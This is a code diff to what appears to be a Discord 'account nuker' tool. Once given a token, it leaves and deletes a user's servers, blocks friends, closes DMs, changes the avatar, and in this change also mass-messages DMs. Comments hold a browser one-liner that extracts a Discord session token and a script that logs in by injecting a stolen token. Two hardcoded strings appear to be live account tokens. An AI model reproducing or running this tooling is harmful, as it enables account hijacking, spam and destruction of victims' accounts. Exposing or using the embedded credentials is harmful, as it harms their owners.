@@ -1,4 +1,4 @@
-from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, DeleteGuilds, SetWorstSettings, CloseDMs
+from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, DeleteGuilds, SetWorstSettings, CloseDMs, MassMessageDM, UserAvatar
 from AresCore import CheckToken, IsGuild, GetAllGuilds
 from Utils import clear
 from rich import print as rprint
@@ -21,16 +21,18 @@ def user_check() -> bool:
 
 
 def AccountNuke() -> None:
+	UserAvatar()
 	LeaveGuilds()
 	DeleteGuilds()
 	BlockFriends()
+	MassMessageDM()
 	CloseDMs()
 	# CreateGuilds()
-	SetWorstSettings()
+	# SetWorstSettings()
 
 # (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
 """
-let token = "your token";function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 2500);}
+let token = "";function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 2500);}
 login(token);
 ODQzMjYyNzYyNDQ4ODQ2ODYw.GCrH5b.3d23ny1fcExearkzKkvwCX57zHuluP_dkcQTnQ
 MTAxNTgyMDY5NzIxMTI0MDQ2OA.Gsc65J.Sy7PFKeBJ-Zl9pYYa4sIf4YPKWY19EmhQVtNYI
